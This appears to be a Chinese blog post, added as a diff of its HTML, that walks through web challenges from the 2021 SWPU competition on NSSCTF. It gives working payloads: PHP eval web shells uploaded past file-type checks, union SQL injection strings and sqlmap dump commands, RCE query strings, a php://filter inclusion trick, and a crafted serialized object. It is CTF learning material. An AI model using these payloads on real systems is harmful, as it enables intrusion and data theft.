@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【NSSCTF】2021SWPU-web | The DC_comics's World</title><meta name="keywords" content="WEB,competition,PHP,文件包含,反序列化,SQL,RCE,文件上传"><meta name="author" content="DC_comics"><meta name="copyright" content="DC_comics"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] SWPU:web:gift_F12:直接查看源码：  easy_md5数组绕过  &lt;?php  highlight_file(__FILE__); include &amp;#x27;flag2.php&amp;#x27;; if (isset($_GET[&amp;#x27;name&amp;#x27;]) &amp;&amp; isset($_POST[&amp;#x27;password&amp;#x27;]))&amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【NSSCTF】2021SWPU-web">
+<meta property="og:url" content="http://www.dccomics.top/2021/10/13/%E3%80%90NSSCTF%E3%80%912021SWPU-web/index.html">
+<meta property="og:site_name" content="The DC_comics&#39;s World">
+<meta property="og:description" content="[TOC] SWPU:web:gift_F12:直接查看源码：  easy_md5数组绕过  &lt;?php  highlight_file(__FILE__); include &amp;#x27;flag2.php&amp;#x27;; if (isset($_GET[&amp;#x27;name&amp;#x27;]) &amp;&amp; isset($_POST[&amp;#x27;password&amp;#x27;]))&amp;#12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg">
+<meta property="article:published_time" content="2021-10-13T14:06:04.000Z">
+<meta property="article:modified_time" content="2022-04-10T16:37:00.652Z">
+<meta property="article:author" content="DC_comics">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="competition">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg"><link rel="shortcut icon" href="/img?"><link rel="canonical" href="http://www.dccomics.top/2021/10/13/%E3%80%90NSSCTF%E3%80%912021SWPU-web/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【NSSCTF】2021SWPU-web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-11 00:37:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s.pc.qq.com/tousu/img/20210616/7147099_1623831911.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The DC_comics's World</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【NSSCTF】2021SWPU-web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-13T14:06:04.000Z" title="发表于 2021-10-13 22:06:04">2021-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-10T16:37:00.652Z" title="更新于 2022-04-11 00:37:00">2022-04-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【NSSCTF】2021SWPU-web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>[TOC]</p>
+<h1 id="SWPU"><a href="#SWPU" class="headerlink" title="SWPU:"></a>SWPU:</h1><h1 id="web"><a href="#web" class="headerlink" title="web:"></a>web:</h1><h2 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12:"></a>gift_F12:</h2><p>直接查看源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012162320078.png" alt="image-20211012162320078"></p>
+<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p>数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"> highlight_file(__FILE__);</span><br><span class="line"> include &#x27;flag2.php&#x27;;</span><br><span class="line"> </span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">    $name = $_GET[&#x27;name&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;wrong!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &#x27;wrong!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">NSSCTF&#123;d54f06fb-cd78-4632-924e-2f78f30c0b17&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211001105128044.png" alt="image-20211001105128044"></p>
+<p>这次真的学到了！！！</p>
+<p>关于MD5函数代码审计：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42777804/article/details/90547641">https://blog.csdn.net/qq_42777804/article/details/90547641</a></p>
+<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql:"></a>easy_sql:</h2><p>sqlmap一把梭</p>
+<p>current database: ‘test_db’</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211001114446116.png" alt="image-20211001114446116"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211001143311697.png" alt="image-20211001143311697"></p>
+<p><strong>第二种：手注！</strong></p>
+<p>这个题真的很easy，结果我整偏了，最后搞报错注入！</p>
+<p>union联合注入</p>
+<p>首先测试order by 查字段：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?wllm=1&#x27;order by 1--+		T</span><br><span class="line">/?wllm=1&#x27;order by 2--+		T</span><br><span class="line">/?wllm=1&#x27;order by 3--+		T</span><br><span class="line">/?wllm=1&#x27;order by 4--+		F</span><br></pre></td></tr></table></figure>
+
+<p>一共有三列。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012164754112.png" alt="image-20211012164754112"></p>
+<p>接着查数据库：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?wllm=-1&#x27;union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012165219512.png" alt="image-20211012165219512"></p>
+<p>数据库为test_db</p>
+<p>然后查数据库中的表名：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?wllm=-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012165841168.png" alt="image-20211012165841168"></p>
+<p>爆表：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=‘test_db’ and table_name=‘test_tb’ --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012170700867.png" alt="image-20211012170700867"></p>
+<p>test_tb一共有两个字段，flag和id。</p>
+<p>最后获取flag:</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27;union select 1,database(),flag from test_tb --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012171023970.png" alt="image-20211012171023970"></p>
+<h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$id=$_POST[&#x27;id&#x27;];</span><br><span class="line">$json=json_decode($_GET[&#x27;json&#x27;],true);</span><br><span class="line">if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)</span><br><span class="line">&#123;echo $flag;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012161938703.png" alt="image-20211012161938703"></p>
+<p>直接构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload： /?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">post:id-wllmNB</span><br></pre></td></tr></table></figure>
+
+<p>这个题考察json格式，很简单。</p>
+<h2 id="caidao"><a href="#caidao" class="headerlink" title="caidao:"></a>caidao:</h2><p>题目中给了提示，直接连接菜刀   wllm，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211001225647423.png" alt="image-20211001225647423"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211001225823264.png" alt="image-20211001225823264"></p>
+<h2 id="do-you-know-http"><a href="#do-you-know-http" class="headerlink" title="do you know http:"></a>do you know http:</h2><p>直接修改用户代理为wllm。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/QQ%E5%9B%BE%E7%89%8720211001230136.png" alt="QQ图片20211001230136"></p>
+<p>./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p>
+<p>RA+K+8ei+_sf</p>
+<h2 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h2><p>典型的文件上传：</p>
+<p>传图片成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025204626474.png" alt="image-20211025204626474"></p>
+<p>修改<code>Content-Type: image/jpeg</code></p>
+<p>可以成功传马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025205232333.png" alt="image-20211025205232333"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025205422667.png" alt="image-20211025205422667"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dccomics&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>连接蚁剑对应目录：<a target="_blank" rel="noopener" href="http://1.14.71.254:28126/upload/shell.php">http://1.14.71.254:28126/upload/shell.php</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025205800937.png" alt="image-20211025205800937"></p>
+<p>显示成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025205826553.png" alt="image-20211025205826553"></p>
+<p>找到了flag.php，但是是假的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025205918198.png" alt="image-20211025205918198"></p>
+<p>真的flag在environment环境变量中，再打上去一个可以执行phpinfo()的文件就行（因为php被禁了，自然是要绕过）</p>
+<p>phtml也被过滤了</p>
+<p>上传一个system.jpg:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025210230036.png" alt="image-20211025210230036"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;system(phpinfo());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>记得改为php文件就行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025210352877.png" alt="image-20211025210352877"></p>
+<p>在蚁剑里刷新一下就行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025210511596.png" alt="image-20211025210511596"></p>
+<p>在网页里访问system.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025210555752.png" alt="image-20211025210555752"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025210619592.png" alt="image-20211025210619592"></p>
+<p>平台老出bug，解决不了，哭了</p>
+<p>突然上传成功了!   happy!!!</p>
+<h2 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h2><p>这道题可以用phtml直接打：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025212658866.png" alt="image-20211025212658866"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025213718525.png" alt="image-20211025213718525"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#x27;dccomics&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211025213921980.png" alt="image-20211025213921980"></p>
+<h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy-rce"></a>easy-rce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">eval($_GET[&#x27;url&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码块可得：</p>
+<p>必须有url变量，并且eval变量所对应的内容会被get方法传参给eval()函数得到回响。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211011154659030.png" alt="image-20211011154659030"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211011154823970.png" alt="image-20211011154823970"></p>
+<h2 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby-rce"></a>baby-rce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://9511-5105c14c-fe3b-4356.nss.ctfer.vip:9080/rasalghul.php/?url=ls$&#123;IFS&#125;/</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://9511-5105c14c-fe3b-4356.nss.ctfer.vip:9080/rasalghul.php/?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012171743213.png" alt="image-20211012171743213"></p>
+<p>源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012171816183.png" alt="image-20211012171816183"></p>
+<p>使用dirsearch进行扫描：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012172329707.png" alt="image-20211012172329707"></p>
+<p>查询robots.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012172411543.png" alt="image-20211012172411543"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html">CTF序列化与反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HelloCTF/p/13044403.html">原链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码中是一个主类wllm,有两个变量$admin和passwd</span><br><span class="line">需要满足：</span><br><span class="line">admin：admin</span><br><span class="line">passwd:ctf</span><br><span class="line">构造：p=O:4:“wllm”:2:&#123;s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:3:“ctf”;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个题没有用到GC机制，所以不用将变量数修改为3或其他大于3的数字。</p>
+<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>题目中说让上传一个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211012230316171.png" alt="image-20211012230316171"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这道题就是一个简单的php伪协议：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>pgsql: sql injection quine</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211019103603657.png" alt="image-20211019103603657"></p>
+<h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>这道题是一道sql注入</p>
+<h3 id="方法1：SQLMAP一把梭"><a href="#方法1：SQLMAP一把梭" class="headerlink" title="方法1：SQLMAP一把梭"></a>方法1：SQLMAP一把梭</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28055</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020102732194.png" alt="image-20211020102732194"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆表:</span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28055</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D test_db <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020103045111.png" alt="image-20211020103045111"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆字段:</span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28055</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D test_db <span class="operator">-</span>T test_tb <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020103237199.png" alt="image-20211020103237199"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆FLAG:</span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28055</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D test_db <span class="operator">-</span>T test_tb <span class="operator">-</span>C flag <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020103411122.png" alt="image-20211020103411122"></p>
